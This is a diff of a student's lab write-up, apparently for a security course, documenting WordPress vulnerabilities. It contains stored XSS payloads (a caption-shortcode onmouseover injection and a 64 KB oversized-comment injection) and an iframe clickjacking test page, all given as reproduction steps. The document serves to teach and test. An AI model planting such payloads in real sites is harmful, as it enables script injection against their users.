@@ -20,8 +20,8 @@ Time spent: **8** hours spent in total
     <img src="https://github.com/vaidehirana/IST-590---Week-7-Project/blob/master/Vulnerability%202.gif" widtch="800">
   
   - [ ] Steps to recreate:
-      Admin login then go to posts and creates a new post with the HTML code “<a href="[caption code=">]</a><a title=" 
-      onmouseover=alert('Carefull!!!')  ">link</a>”. The post is then updated and when clicked view page it will redirect to the page 
+      Admin login then go to posts and creates a new post with the HTML code ``` “<a href="[caption code=">]</a><a title=" 
+      onmouseover=alert('Carefull!!!')  ">link</a>” ``` The post is then updated and when clicked view page it will redirect to the page 
       with the post. When you see the post there is a link and when user or admin mouse over it will give the XSS message.
   
   - [ ] Affected source code:
@@ -43,8 +43,8 @@ Time spent: **8** hours spent in total
   
   - [ ] Steps to recreate: 
       Admin login then create a post or use existing post and log out from the page and then an user add comment to the posts which is 
-      64 kb or larger. The comment would be “<a title='x onmouseover=alert(unescape(/hello%20world/.source)) 
-      style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>” but add AAAA in the code to so 
+      64 kb or larger. The comment would be ``` “<a title='x onmouseover=alert(unescape(/hello%20world/.source)) 
+      style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>” ``` but add AAAA in the code to so 
       it goes over 64 kb. Once the comment is posted the XSS message pops up.
   
   - [ ] Affected source code:
@@ -62,6 +62,7 @@ Time spent: **8** hours spent in total
   
   - [ ] Steps to recreate: 
       User or Admin login to the WordPress under the posts add a comment with the following HTML code
+     ```
      "<html>
        <head>
          <title>Clickjack test page</title>
@@ -71,6 +72,7 @@ Time spent: **8** hours spent in total
          <iframe src="http://www.target.site" width="500" height="500"></iframe>
        </body>
       </html>"
+      ```
       Once the code is submitted in the comment then the website would show if there was a ClickkJacking vulnerability 
 
   - [ ] Affected source code:
